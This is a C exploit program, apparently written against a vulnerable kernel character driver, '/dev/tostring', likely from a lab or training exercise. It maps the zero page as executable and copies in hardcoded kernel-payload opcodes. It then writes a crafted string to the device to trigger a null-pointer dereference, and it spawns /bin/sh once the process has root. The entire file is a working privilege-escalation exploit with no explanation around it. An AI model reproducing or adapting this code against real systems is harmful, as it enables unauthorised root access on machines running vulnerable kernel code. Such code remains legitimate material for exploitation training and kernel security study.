#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <unistd.h>

#define CHAR_DEV "/dev/tostring"

 
void main(void)
{
    char opcodes[] =  "\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3";
    uint32_t* mem = mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem) {
        fprintf(stderr, "[^] unable to map zero page\n");
        exit(-1);
    }
    memcpy(0, opcodes, sizeof(opcodes));
    fprintf(stdout, "[^] zero page mapped, triggering null dereference \n");
    int fd = open(CHAR_DEV, O_RDWR);
    write(fd, "**********S", 12);
    read(fd, opcodes, 4);
    if(!getuid()) {
        system("/bin/sh");
    }
}